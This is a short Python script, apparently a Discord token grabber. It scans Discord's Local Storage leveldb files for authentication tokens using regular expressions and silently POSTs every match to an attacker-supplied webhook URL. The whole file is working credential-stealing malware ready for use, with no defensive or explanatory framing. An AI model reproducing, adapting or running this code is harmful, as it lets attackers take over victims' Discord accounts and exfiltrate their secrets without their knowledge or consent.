import time, random, string, os, re, json
from urllib.request import Request, urlopen 

Webhook = 'ur webhook here'

def searchtokens(path):
    path += '\\Local Storage\\leveldb' # using this path to find tokens
    flacreset = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # this is where tokens are located
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    flacreset.append(token)
    return flacreset

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = {'': roaming + '\\Discord'}
    r = ''
    for GetData, path in paths.items():
        if not os.path.exists(path):
            continue
        r += f'\n{GetData}\n```'
        tokens = searchtokens(path)
        if len(tokens) > 0:
            for token in tokens:
                r += f'{token}\n'
        else:
            r += '\n'
        r += '```'
    Headers = {'Content-Type': 'application/json','User-Agent': 'http://127.0.0.1/rpc:1683'} # im only using this link because it messes up the webhook
    GetData = json.dumps({'content': r})
    try:
        req = Request(Webhook, data=GetData.encode(), headers=Headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
